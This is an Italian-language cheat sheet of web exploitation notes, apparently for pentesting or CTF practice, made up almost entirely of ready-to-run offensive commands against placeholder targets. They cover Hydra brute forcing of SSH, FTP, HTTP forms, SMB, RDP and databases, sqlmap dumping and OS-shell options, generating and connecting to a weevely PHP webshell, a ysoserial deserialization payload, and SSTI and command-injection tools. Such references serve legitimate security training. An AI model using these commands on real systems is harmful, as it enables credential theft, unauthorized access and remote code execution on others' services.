# 🌐 Web Exploitation

Appunti e snippet per la fase di **exploitation su applicazioni web**.

## 📌 Obiettivi

* Bypassare login e sessioni
* Sfruttare vulnerabilità di tipo SQLi/XSS/LFI/RFI
* Abusare di file upload e deserialization
* Identificare e sfruttare vulnerabilità CMS
* Attaccare template engine e servizi lato server (SSTI/SSRF/RCE)

---

## 🔑 Hydra (Brute Force Login)

**Perché usarlo:**
Hydra è uno degli strumenti più veloci e versatili per il brute force di credenziali. Supporta molti protocolli: HTTP(S), FTP, SSH, SMB, RDP, MySQL, PostgreSQL e altri.
Si usa quando trovi un servizio o un form di login e vuoi testare combinazioni di username/password da wordlist.

**Opzioni principali:**

* `-l` → singolo username
* `-L` → wordlist di username
* `-p` → singola password
* `-P` → wordlist di password
* `-s` → porta (se diversa dal default)
* `-t` → numero thread (default 16, utile aumentare a 32–64 per velocizzare)
* `-f` → stop al primo login valido trovato
* `-o` → salva risultati su file
* `-V` → modalità verbose (mostra ogni tentativo)

---

### 🔹 Comandi diretti (solo output su CLI)

#### 🖥️ SSH

```bash
# Brute force su SSH con utente noto
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>

# Wordlist di utenti e password insieme
hydra -L users.txt -P passwords.txt ssh://<target-ip> -t 32 -f
```

#### 📁 FTP

```bash
# Brute force su FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>

# Specifica porta non standard
hydra -l admin -P rockyou.txt ftp://<target-ip>:2121
```

#### 🌐 HTTP Basic Auth

```bash
# HTTP Basic Auth (username + password)
hydra -L users.txt -P passwords.txt <target-ip> http-get /

# HTTP su porta custom
hydra -l admin -P pass.txt <target-ip> -s 8080 http-get /
```

#### 🌐 HTTP Form (POST)

```bash
# Form POST classico con messaggio di errore 'Invalid'
hydra -l admin -P rockyou.txt <target-ip> \
http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Esempio con redirect (quando login valido non mostra 'Invalid')
hydra -l admin -P pass.txt <target-ip> \
http-post-form "/login:username=^USER^&password=^PASS^:S=dashboard"
```

#### 🌐 HTTP Form (GET)

```bash
# Login tramite GET (raro ma capita)
hydra -L users.txt -P passwords.txt <target-ip> \
http-get-form "/login.php?user=^USER^&pass=^PASS^:Invalid login"
```

#### 📦 SMB

```bash
# SMB login brute force
hydra -L users.txt -P passwords.txt smb://<target-ip>
```

#### 🖥️ RDP

```bash
# Brute force su Remote Desktop Protocol
hydra -L users.txt -P passwords.txt rdp://<target-ip>
```

#### 💾 MySQL

```bash
# Brute force su MySQL
hydra -L users.txt -P passwords.txt mysql://<target-ip>
```

#### 📊 PostgreSQL

```bash
# Brute force su PostgreSQL
hydra -L users.txt -P passwords.txt postgres://<target-ip>
```

---

### 💾 Comandi con salvataggio su file

```bash
# Salva risultati in formato leggibile
hydra -l admin -P rockyou.txt ssh://<target-ip> -o hydra_results.txt

# Aggiungi verbose per logging più dettagliato
hydra -l admin -P rockyou.txt ssh://<target-ip> -V -o hydra_verbose.txt
```

---

### ⚡ Tips & Trucchi

* Usa `-f` per fermarti al primo risultato valido (utile in CTF).
* Combina `-L` e `-P` per brute force completo utenti+password.
* Per evitare blocchi → rallenta il brute con `-W` (wait time) o riduci `-t`.
* Su HTTP, osserva sempre la **stringa di fail (`F=`)** o di successo (`S=`): se sbagli, Hydra darà falsi negativi.
* In alternativa ai form HTTP, puoi usare **Burp Intruder** se la logica del login è più complessa (token CSRF, parametri nascosti, JSON).

---

## 💉 sqlmap (SQL Injection)

**Perché usarlo:**
Automatizza la ricerca e lo sfruttamento di SQL Injection. Consente di estrarre database, tabelle e perfino eseguire comandi sul sistema.

**Opzioni principali:**

* `--dbs` → enumera database
* `--tables -D` → enumera tabelle di un DB
* `--dump -T -D` → estrae dati da una tabella specifica
* `--os-shell` → ottiene RCE se possibile

### 🔹 Comandi diretti

```bash
# Test e dump completo
sqlmap -u "http://<target-ip>/item.php?id=1" --batch --dump
```

### 💾 Salvataggio output

```bash
sqlmap -u "http://<target-ip>/item.php?id=1" --batch --dump --output-dir=sqlmap_results
```

---

## 🧨 XSStrike (XSS Testing)

**Perché usarlo:**
Scanner avanzato per rilevare e sfruttare Cross-Site Scripting (XSS), più accurato rispetto al semplice brute-force di payload.

**Opzioni principali:**

* `-u` → URL target
* `--crawl` → attiva crawling del sito
* `--blind` → rileva XSS blind

### 🔹 Comandi diretti

```bash
# Scan rapido
xsstrike -u http://<target-ip>/search.php?q=test
```

### 💾 Salvataggio output

```bash
xsstrike -u http://<target-ip>/search.php?q=test --log-file xsstrike.txt
```

---

## 📂 LFISuite (LFI Exploitation)

**Perché usarlo:**
Automatizza la ricerca di Local File Inclusion, testando path traversal e wrapper PHP.

**Opzioni principali:**

* `-u` → URL target
* `-p` → parametro vulnerabile

### 🔹 Comandi diretti

```bash
# Scan su parametro page
python3 lfisuite.py -u "http://<target-ip>/index.php?page=home" -p page
```

### 💾 Salvataggio output

```bash
python3 lfisuite.py -u "http://<target-ip>/index.php?page=home" -p page | tee lfi_results.txt
```

---

## 📦 weevely3 (Webshell Generator)

**Perché usarlo:**
Genera webshell PHP obfuscate da caricare tramite upload vulnerabile. Permette di avere un client interattivo con moduli integrati (esecuzione comandi, file transfer, enumeration).

### 🔹 Comandi diretti

```bash
# Generazione webshell
weevely generate mysecretpass shell.php

# Connessione alla webshell caricata
weevely http://<target-ip>/uploads/shell.php mysecretpass
```

---

## 🏗️ WPScan (WordPress Exploitation)

**Perché usarlo:**
Scanner specifico per WordPress. Enumera utenti, plugin e vulnerabilità note tramite database CVE.

**Opzioni principali:**

* `--url` → URL target
* `--enumerate u,p` → enumera utenti e plugin
* `--api-token` → necessario per database vulnerabilità aggiornato

### 🔹 Comandi diretti

```bash
wpscan --url http://<target-ip>/ --enumerate u,p
```

### 💾 Salvataggio output

```bash
wpscan --url http://<target-ip>/ --enumerate u,p --api-token <TOKEN> -o wpscan.txt
```

---

## 🧾 ysoserial (Java Deserialization)

**Perché usarlo:**
Crea payload malevoli per sfruttare vulnerabilità di deserializzazione in Java (commons-collections, groovy, ecc.).

### 🔹 Comandi diretti

```bash
# Genera payload CommonsCollections1 con esecuzione di 'calc.exe'
java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.bin
```

---

## 🌐 tplmap (SSTI Exploitation)

**Perché usarlo:**
Automatizza la rilevazione e lo sfruttamento di Server-Side Template Injection (Jinja2, Twig, Velocity, ecc.).

### 🔹 Comandi diretti

```bash
tplmap -u "http://<target-ip>/index.php?name=FUZZ" -d "name=FUZZ"
```

---

## ⚡ Commix (Command Injection)

**Perché usarlo:**
Strumento per rilevare e sfruttare vulnerabilità di command injection in parametri web.

### 🔹 Comandi diretti

```bash
commix --url="http://<target-ip>/vuln.php?cmd=ls"
```
